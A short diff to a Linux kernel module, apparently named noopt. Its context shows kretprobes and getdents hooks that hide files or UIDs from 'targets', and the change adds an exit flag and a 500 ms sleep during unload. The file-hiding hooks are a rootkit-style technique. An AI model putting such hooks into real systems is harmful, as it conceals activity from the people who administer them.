@@ -63,6 +63,10 @@ static char deny_uids[UID_LIST_LEN];
 module_param_string(deny_uids, deny_uids, sizeof(deny_uids), 0000);
 MODULE_PARM_DESC(deny_uids, "Comma-separated UIDs hidden from targets");
 
+
+/* Safe module unload: prevent new handlers during exit */
+static bool module_exiting = false;
+
 /* system-unique target identifiers */
 struct hidden_target {
 	dev_t dev;
@@ -580,6 +584,9 @@ static int __init noopt_init(void)
 
 static void __exit noopt_exit(void)
 {
+	module_exiting = true;
+	/* Wait for RCU and in-flight handlers */
+	msleep(500);
 	unregister_kretprobe(&kp_inode_perm);
 	unregister_kretprobe(&kp_inode_getattr);
 	if (getdents_registered) {
